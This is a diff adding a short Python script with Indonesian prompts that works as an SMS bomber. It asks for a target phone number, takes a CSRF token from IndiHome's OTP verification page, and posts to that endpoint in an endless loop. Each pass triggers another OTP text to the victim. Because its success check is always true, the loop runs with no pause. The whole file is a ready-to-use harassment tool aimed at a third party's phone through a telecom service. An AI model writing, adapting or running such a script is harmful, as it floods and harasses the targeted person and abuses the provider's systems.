@@ -1,0 +1,48 @@
+import re
+import sys
+import requests
+import os
+import time
+import subprocess
+def bersih():
+    subprocess.call("clear",shell=True)
+def thex(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(1./12)
+def selesai():
+    print ("\033[91mGOODBYE..")
+    time.sleep(1)
+    sys.exit()
+def kembali():
+    f = input("\x1b[1;92mcoba lagi?\x1b[1;97m (y/t): ")
+    if f == "y":
+       bersih()
+       subprocess.call("python indihome.py",shell=True)
+    elif f == "t":
+         selesai()
+    else:
+         print ("Tidak ada input\x1b[1;91m!!!")
+         time.sleep(2)
+         subprocess.call("python indihome.py",shell=True)
+
+s = requests.Session()
+url = "https://www.indihome.co.id/verifikasi-layanan/login-otp"
+no = input('\n'"\033[97mMasukan Nomor Target :\x1b[1;92m ")
+token = s.get(url).text
+token = re.findall(r"name=\"_token\" value=\"(.*?)\"", token)[0]
+ 
+data = {
+"_token":token,
+"msisdn":no,
+}
+
+while True:
+    send = s.post(url, data=data).text
+    if 'Gagal!' or 'dikirim' in send:
+        print("\x1b[1;97m[\x1b[1;92mBerhasil\x1b[1;97m]Mengirim Sms Kenomor:\x1b[1;97m[\x1b[1;92m",no,"\x1b[1;97m]")
+    else:
+        print("gagal mengirim!!!")
+        time.sleep(1)
+        kembali()
